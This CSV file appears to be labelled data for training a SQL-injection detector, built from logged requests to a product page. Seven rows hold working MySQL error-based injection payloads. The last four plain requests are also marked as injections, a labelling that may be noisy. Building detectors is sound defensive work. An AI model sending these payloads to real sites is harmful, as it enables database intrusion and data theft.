full_url,parsed_url,hostname,event_time,sql_keyword,params_length,request_volume,special_chars,values_to_length,injection
/details.php?prod=5%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x71717a6271%2C%28SELECT%20%28ELT%284924%3D4924%2C1%29%29%29%2C0x717a626271%2C0x78%29%29x%29%29&type=%3F,"/details.php?prod=5 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(4924=4924,1))),0x717a626271,0x78))x))&type=?",192.168.43.6,1681395107.7715,3,104,4.2,0,2.8846153846153846,1
/details.php?prod=5%20AND%20GTID_SUBSET%28CONCAT%280x71717a6271%2C%28SELECT%20%28ELT%282364%3D2364%2C1%29%29%29%2C0x717a626271%29%2C2364%29&type=%3F,"/details.php?prod=5 AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(2364=2364,1))),0x717a626271),2364)&type=?",192.168.43.6,1681395107.77752,3,86,4.2,0,3.488372093023256,1
/details.php?prod=5%20OR%20GTID_SUBSET%28CONCAT%280x71717a6271%2C%28SELECT%20%28ELT%283235%3D3235%2C1%29%29%29%2C0x717a626271%29%2C3235%29&type=%3F,"/details.php?prod=5 OR GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(3235=3235,1))),0x717a626271),3235)&type=?",192.168.43.6,1681395107.860414,3,85,4.2,0,3.5294117647058822,1
/details.php?prod=5%20AND%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x71717a6271%2C%28SELECT%20%28ELT%289548%3D9548%2C1%29%29%29%2C0x717a626271%29%29%20USING%20utf8%29%29%29&type=%3F,"/details.php?prod=5 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(9548=9548,1))),0x717a626271)) USING utf8)))&type=?",192.168.43.6,1681395107.865954,3,117,4.2,0,2.5641025641025643,1
/details.php?prod=5%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281079%3D1079%2C1%29%29%29%2C0x717a626271%29%29%20USING%20utf8%29%29%29&type=%3F,"/details.php?prod=5 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(1079=1079,1))),0x717a626271)) USING utf8)))&type=?",192.168.43.6,1681395107.915821,3,116,4.2,0,2.586206896551724,1
/details.php?prod=5%20AND%20%28SELECT%202695%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%282695%3D2695%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29&type=%3F,"/details.php?prod=5 AND (SELECT 2695 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(2695=2695,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&type=?",192.168.43.6,1681395107.9238,6,166,4.2,0,3.6144578313253013,1
/details.php?prod=%28SELECT%20CONCAT%280x71717a6271%2C%28ELT%287404%3D7404%2C1%29%29%2C0x717a626271%29%29&type=%3F,"/details.php?prod=(SELECT CONCAT(0x71717a6271,(ELT(7404=7404,1)),0x717a626271))&type=?",192.168.43.6,1681395107.99244,1,62,4.2,0,1.6129032258064515,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,192.168.43.6,1681395107.998467,0,2,4.2,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,192.168.43.6,1681395108.001909,0,2,4.2,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,192.168.43.6,1681395108.050194,0,2,4.2,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,192.168.43.6,1681395108.054457,0,2,4.2,0,0.0,1
